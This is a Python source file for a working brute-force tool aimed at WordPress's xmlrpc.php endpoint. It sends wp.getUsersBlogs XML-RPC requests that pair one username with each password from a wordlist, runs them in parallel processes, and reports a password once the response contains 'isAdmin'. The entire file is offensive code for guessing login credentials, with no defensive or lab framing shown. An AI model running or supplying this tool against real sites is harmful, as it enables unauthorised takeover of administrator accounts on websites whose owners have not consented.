import requests
from multiprocessing import Pool, Manager


class XMLRpcBruteForcer:

    def __init__(self, username, wordlist, url, processes=3, verbose=False) -> None:
        self.url = url
        self.username = username
        self.wordlist = wordlist
        self.num_processes = processes
        self.session = self.create_session_object()
        self.payload = """<?xml version="1.0"?>
<methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
        <param>
            <value>
                <string>{username}</string>
            </value>
        </param>
        <param>
            <value>
                <string>{password}</string>
            </value>
        </param>
    </params>
</methodCall>"""
        self.verbose = verbose

    def create_session_object(self) -> requests.Session:
        headers = { "User-Agent": "Python-xmlrpc/3.13", "Content-Type": "text/xml" }

        session = requests.Session()
        session.headers.update(headers)

        return session

    def attempt_password(self, args) -> None | str:
        password, stop_event = args
        if stop_event.is_set():
            return None
        
        try:
            if self.verbose:
                print(f"[?] Trying password: {password}")
            data = self.payload.format(username=self.username, password=password)
            response = self.session.post(self.url, data)
        
            isFound = self.check_password(response.text)
            if isFound:
                stop_event.set()
                return password
        except Exception as e:
            print(f"Error with password {password}: {e}") if self.verbose else None
        
        return None

    def check_password(self, answer) -> bool:
        return "isAdmin" in answer

    def check_url(self) -> bool:
        data = self.payload.format(username="username", password="password")
        response = self.session.post(self.url, data)
        return response.status_code == 200 and "Incorrect username or password" in response.text

    def start(self):
        is_url_valid = self.check_url()
        if is_url_valid:
            print('[+] Good News! xmlrpc.php is enabled.')

            with open(self.wordlist, 'r', encoding='utf-8', errors='replace') as wordlist:
                passwords = [ line.strip() for line in wordlist.readlines() ]

            with Manager() as manager:
                stop_event = manager.Event()
                pool = Pool(self.num_processes)

                results = pool.imap(self.attempt_password, ((password, stop_event) for password in passwords))

                for result in results:
                    if result:
                        pool.terminate()
                        print(f"[+] Found the password: {result}")
                        return

                print(f"[-] No matching password found.")
        else:
            print('[-] Bad News! xmlrpc.php is not enabled on the given URL.')
            return